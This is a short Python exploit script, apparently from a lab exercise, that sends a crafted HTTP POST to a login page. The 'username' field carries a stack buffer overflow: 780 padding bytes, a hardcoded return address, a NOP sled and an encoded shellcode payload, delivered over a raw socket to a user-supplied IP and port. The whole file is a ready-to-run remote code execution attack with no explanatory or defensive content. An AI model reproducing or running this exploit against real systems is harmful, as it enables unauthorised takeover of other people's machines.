#!/usr/bin/python3

import sys,socket
from time import sleep

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0):
        print("*" * 30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")

elif (len(ip_address)>0) or (len(port_number)>0):
    buf =  b""
    buf += b"\xda\xc1\xd9\x74\x24\xf4\xba\x4e\x34\x48\xae\x5b"
    buf += b"\x29\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\x1d"
    buf += b"\x27\xaa\x5b\x5d\xaf\xa8\xa4\x9d\x30\xcd\x2d\x78"
    buf += b"\x01\xcd\x4a\x09\x32\xfd\x19\x5f\xbf\x76\x4f\x4b"
    buf += b"\x34\xfa\x58\x7c\xfd\xb1\xbe\xb3\xfe\xea\x83\xd2"
    buf += b"\x7c\xf1\xd7\x34\xbc\x3a\x2a\x35\xf9\x27\xc7\x67"
    buf += b"\x52\x23\x7a\x97\xd7\x79\x47\x1c\xab\x6c\xcf\xc1"
    buf += b"\x7c\x8e\xfe\x54\xf6\xc9\x20\x57\xdb\x61\x69\x4f"
    buf += b"\x38\x4f\x23\xe4\x8a\x3b\xb2\x2c\xc3\xc4\x19\x11"
    buf += b"\xeb\x36\x63\x56\xcc\xa8\x16\xae\x2e\x54\x21\x75"
    buf += b"\x4c\x82\xa4\x6d\xf6\x41\x1e\x49\x06\x85\xf9\x1a"
    buf += b"\x04\x62\x8d\x44\x09\x75\x42\xff\x35\xfe\x65\x2f"
    buf += b"\xbc\x44\x42\xeb\xe4\x1f\xeb\xaa\x40\xf1\x14\xac"
    buf += b"\x2a\xae\xb0\xa7\xc7\xbb\xc8\xea\x8f\x08\xe1\x14"
    buf += b"\x50\x07\x72\x67\x62\x88\x28\xef\xce\x41\xf7\xe8"
    buf += b"\x31\x78\x4f\x66\xcc\x83\xb0\xaf\x0b\xd7\xe0\xc7"
    buf += b"\xba\x58\x6b\x17\x42\x8d\x3c\x47\xec\x7e\xfd\x37"
    buf += b"\x4c\x2f\x95\x5d\x43\x10\x85\x5e\x89\x39\x2c\xa5"
    buf += b"\x5a\x86\x19\xc1\x40\x6e\x58\x09\x76\x9d\xd5\xef"
    buf += b"\x12\x71\xb0\xb8\x8a\xe8\x99\x32\x2a\xf4\x37\x3f"
    buf += b"\x6c\x7e\xb4\xc0\x23\x77\xb1\xd2\xd4\x77\x8c\x88"
    buf += b"\x73\x87\x3a\xa4\x18\x1a\xa1\x34\x56\x07\x7e\x63"
    buf += b"\x3f\xf9\x77\xe1\xad\xa0\x21\x17\x2c\x34\x09\x93"
    buf += b"\xeb\x85\x94\x1a\x79\xb1\xb2\x0c\x47\x3a\xff\x78"
    buf += b"\x17\x6d\xa9\xd6\xd1\xc7\x1b\x80\x8b\xb4\xf5\x44"
    buf += b"\x4d\xf7\xc5\x12\x52\xd2\xb3\xfa\xe3\x8b\x85\x05"
    buf += b"\xcb\x5b\x02\x7e\x31\xfc\xed\x55\xf1\x1c\x0c\x7f"
    buf += b"\x0c\xb5\x89\xea\xad\xd8\x29\xc1\xf2\xe4\xa9\xe3"
    buf += b"\x8a\x12\xb1\x86\x8f\x5f\x75\x7b\xe2\xf0\x10\x7b"
    buf += b"\x51\xf0\x30"

    size=b"A" * 780 + b"\x83\x0C\x09\x10" + b"C" * 4 + b"\x90"*16 + buf
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    buff=b"username=" + size + b"&password=A"


    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.215\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8')+ b"\r\n"
    buffer+=b"Origin: http://192.168.100.215\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.215/login\r\n"
    buffer+=b"\r\n"

    buffer=buffer+buff
    s.send((buffer))
    s.close()
